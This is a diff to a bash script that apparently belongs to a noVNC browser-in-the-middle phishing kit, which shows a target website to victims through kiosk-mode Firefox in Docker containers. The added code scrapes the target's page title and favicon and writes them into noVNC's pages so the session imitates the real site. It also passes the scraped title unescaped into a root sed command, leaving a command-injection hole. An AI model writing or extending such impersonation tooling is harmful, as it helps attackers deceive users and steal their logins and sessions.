@@ -90,6 +90,13 @@ case "$1" in
 
 	START=1
 	END=$User
+	
+	temptitle=$(curl $Target -sL | grep -oP '(?<=title).*(?<=title>)' | grep -oP '(?=>).*(?=<)') 
+	pagetitle="${temptitle:1}"
+	
+	curl https://www.google.com/s2/favicons?domain=$Target -sL --output novnc.ico
+	icopath="./novnc.ico"
+	
 	printf "[-] Configuration file generating\033[0K\r" 
 	echo "NameVirtualHost *" > ./proxy/000-default.conf
 	
@@ -193,6 +200,22 @@ case "$1" in
 	    fi
 	    
 	    sleep 1
+	    echo $pagetitle
+	    if [ -n "$pagetitle" ]
+	    then
+	        sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/conn.html"
+	        sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/app/ui.js"
+	    fi
+	    
+	    if [ -e $icopath ]
+	    then
+	    	sudo docker cp ./novnc.ico vnc-user$c:/usr/libexec/noVNCdim/app/images/icons/novnc.ico
+	    	rm -r ./novnc.ico
+	    fi
+	    
+	    
+	    
+	    
 	    sudo docker exec vnc-user$c sh -c "xfconf-query --channel xsettings --property /Gtk/CursorThemeName --set WinCursor &" 
 	    sudo docker exec vnc-user$c sh -c "xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &" &> /dev/null
 	    
